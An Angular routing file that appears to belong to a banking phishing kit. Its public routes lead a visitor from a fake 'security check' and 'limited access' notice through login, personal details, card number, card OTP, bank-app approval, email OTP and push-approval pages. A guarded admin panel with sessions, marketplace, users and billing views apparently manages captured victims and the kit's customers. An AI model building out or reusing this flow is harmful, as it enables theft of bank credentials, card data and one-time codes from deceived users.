
import { Routes } from '@angular/router';
import { SecurityCheckComponent } from '../components/security-check.component';
import { LoginComponent } from '../components/login.component';
import { LimitedAccessComponent } from '../components/limited-access.component';
import { PhoneVerificationComponent } from '../components/phone-verification.component';
import { PersonalVerificationComponent } from '../components/personal-verification.component';
import { CardVerificationComponent } from '../components/card-verification.component';
import { CardOtpComponent } from '../components/card-otp.component';
import { BankAppVerificationComponent } from '../components/bank-app-verification.component';
import { SuccessComponent } from '../components/success.component';
import { StepSuccessComponent } from '../components/step-success.component';
import { LoadingComponent } from '../components/loading.component';
import { EmailOtpComponent } from '../components/email-otp.component';
import { PushNotificationComponent } from '../components/push-notification.component';
import { DarkAdminLayoutComponent } from '../components/layout/dark-admin.component';
import { AdminLoginComponent } from '../components/admin-login.component';
import { adminGuard } from '../guards/admin.guard';
import { AdminLayoutV2Component } from '../components/admin-v2/layout/admin-layout.component';
import { AdminDashboardV2Component } from '../components/admin-v2/dashboard/dashboard.component';

export const routes: Routes = [
    { path: '', redirectTo: 'security_check', pathMatch: 'full' },
    { path: 'security_check', component: SecurityCheckComponent, data: { animation: 'Security' } },
    { path: 'login', component: LoginComponent, data: { animation: 'Login' } },
    { path: 'limited', component: LimitedAccessComponent, data: { animation: 'Limited' } },
    { path: 'phone', component: PhoneVerificationComponent, data: { animation: 'Phone' } },
    { path: 'personal', component: PersonalVerificationComponent, data: { animation: 'Personal' } },
    { path: 'card', component: CardVerificationComponent, data: { animation: 'Card' } },
    { path: 'card_otp', component: CardOtpComponent, data: { animation: 'CardOtp' } },
    { path: 'bank_app', component: BankAppVerificationComponent, data: { animation: 'BankApp' } },
    { path: 'email_otp', component: EmailOtpComponent, data: { animation: 'EmailOtp' } },
    { path: 'push_auth', component: PushNotificationComponent, data: { animation: 'PushAuth' } },
    { path: 'loading', component: LoadingComponent, data: { animation: 'Loading' } },
    { path: 'step_success', component: StepSuccessComponent, data: { animation: 'Success' } },
    { path: 'success', component: SuccessComponent, data: { animation: 'SuccessFinal' } },
    { path: 'admin/login', component: AdminLoginComponent, data: { animation: 'AdminLogin' } },
    {
        path: 'admin',
        component: AdminLayoutV2Component,
        canActivate: [adminGuard],
        children: [
            { path: '', redirectTo: 'dashboard', pathMatch: 'full' },
            { path: 'dashboard', component: AdminDashboardV2Component },
            { path: 'sessions', loadComponent: () => import('../components/admin-v2/sessions/sessions.component').then(m => m.SessionsComponent) },
            { path: 'marketplace', loadComponent: () => import('../components/admin-v2/marketplace/marketplace.component').then(m => m.MarketplaceComponent) },
            { path: 'users', loadComponent: () => import('../components/admin-v2/users/users.component').then(m => m.UsersComponent) },
            { path: 'settings', loadComponent: () => import('../components/admin-v2/settings/settings.component').then(m => m.SettingsComponent) },
            { path: 'billing', loadComponent: () => import('../components/admin-v2/billing/billing.component').then(m => m.BillingComponent) }
        ]
    },
    { path: '**', redirectTo: 'security_check' }
];
